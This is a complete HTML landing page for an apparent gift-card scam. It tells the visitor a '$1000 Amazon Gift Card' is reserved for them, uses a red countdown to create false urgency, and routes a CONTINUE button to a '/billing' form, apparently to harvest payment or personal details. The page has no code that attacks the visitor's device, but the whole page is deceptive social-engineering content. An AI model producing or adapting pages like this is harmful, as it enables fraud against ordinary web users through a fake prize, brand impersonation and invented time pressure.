<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f9f9f9;
        }
        .container {
            background: #fff;
            border: 2px solid #ddd;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            display: inline-block;
        }
        h1 {
            color: #333;
        }
        .countdown {
            color: red;
            font-weight: bold;
        }
        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CONGRATULATIONS!</h1>
        <p>(1) $1000 Amazon Gift Card is reserved just for you!</p>
        <p>Step 1: Click the "CONTINUE" button to claim your prize.<br>
           Step 2: Enter the correct information on the next page to claim your prize.</p>
        <p class="countdown">You only have 4 minutes 14 seconds to claim your prize!</p>
        <form action="/billing">
            <button type="submit">CONTINUE</button>
        </form>
    </div>
</body>
</html>
